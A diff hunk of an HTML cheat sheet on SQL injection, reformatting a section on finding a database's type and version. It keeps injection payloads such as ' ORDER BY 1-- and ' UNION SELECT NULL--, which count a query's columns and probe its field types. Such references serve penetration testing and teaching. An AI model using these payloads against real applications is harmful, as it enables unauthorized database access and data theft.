@@ -96,17 +96,19 @@
 </details>
 <details>
 <summary>DATABASE TYPE/VERSION TECHNIQUES</summary>
-<p><b>DESCRIPTION:</b> Techniques used to retrieve the database version.</p>
-<p><b>STEPS: </b>
+<p><b>DESCRIPTION:</b> Techniques used to retrieve the database version.
+<b>STEPS:</b>
 1. get column number
 <b>method1:</b>' ORDER BY 1--
 <b>method2:</b>' UNION SELECT NULL--
 2. get field type
 ' UNION SELECT 'a',NULL,NULL,NULL--
 ' UNION SELECT NULL,'a',NULL,NULL--
+	
 NOTE: It is needed to be iterative so you can find the right field type. For that number of columns
-is needed. </p>		
-<p><b>COMMON TESTS:</b>
+is needed.
+	
+<b>COMMON TESTS:</b>
 
 <b>ORACLE:</b>  
 
